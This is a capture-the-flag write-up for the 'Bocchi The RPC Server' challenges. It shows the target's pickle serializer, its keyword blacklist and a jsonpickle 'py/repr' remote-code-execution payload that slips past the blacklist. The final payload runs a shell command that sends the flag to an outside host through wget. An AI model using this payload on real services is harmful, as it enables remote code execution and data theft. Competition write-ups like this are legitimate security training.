**Problems: Bocchi The RPC Server v1 & v2**
Solver: @goldensang @phulelouch

Problem context:
- The problems propose a rpcpy.py application with a route /sayhi
- And trigger the ./readflag application to get the flag

Analysis:

application.py
```python
  def preprocess(self, request: WsgiRequest | AsgiRequest) -> typing.Tuple[BaseSerializer, typing.Callable]:
        """
        Preprocess request
        """
        # check request method
        if request.method != "POST":
            raise CallbackError(content="", status_code=405)

        # check serializer
        try:
            serializer = get_serializer(request.headers)
        except SerializerNotFound as exception:
            raise CallbackError(content=str(exception), status_code=415)

        # check callback
        callback = self.callbacks.get(request.url.path[len(self.prefix) :], None)
        if callback is None:
            raise CallbackError(content="", status_code=404)

        return serializer, callback

```
serializer.py
```python
class PickleSerializer(BaseSerializer):
    name = "pickle"
    content_type = "application/x-pickle"

    def encode(self, data: typing.Any) -> bytes:
        return pickle.dumps(data)

    def decode(self, data: bytes) -> typing.Any:
        return pickle.loads(data)
BLACKLIST = [
    "builtin",
    "exec",
    "eval",
    "getattr",
    "globals",
    "import",
    "lambda",
    "locals",
    "marshal",
    "os",
    "pickle",
    "posix",
    "pty",
    "setattr",
    "shelve",
    "sys",
    "system",
    "subprocess",
    "timeit",
]
def is_blacklisted(data):
    for bl in BLACKLIST:
        if bl.encode() in data:
            print(bl)
            return True
    return False


```

After consider the flow, we realized that JsonPickle can be attacked, so we need to find a payload to bypass the Blacklist & get the flag, presumably RCE attack

After a little research, i found the RCE for the job:
https://www.exploit-db.com/exploits/49585
We can trigger any python code with this payload
Payload should looks like this: 
```python
malicious = '{"1": {"py/repr": "time/time.sleep(10)"}, "2": {"py/id": 67}}'
```

After that what's left is to forge a payload, we know a neet trick of forging it with SSTIs payload
And the final result looks somewhat like this:
```python
malicious = '{"1": {"py/repr": "time/print(().__class__.__bases__[0].__subclasses__()[364]('cd ..; wget http:$(pwd)$(pwd)ip and port$(pwd)$($(pwd)readflag) ',shell=True,stdout=-1).communicate()[0].strip())"}, "2": {"py/id": 32}}'
```

Flag: 
W1{Bocchi_The_JSON_Pickle_b038d18a562fec32f7055596f883f185}
W1{Bocchi_The_LD_PRELOAD_f69a9e0d4a45f98c09cd9bfe3730601e}
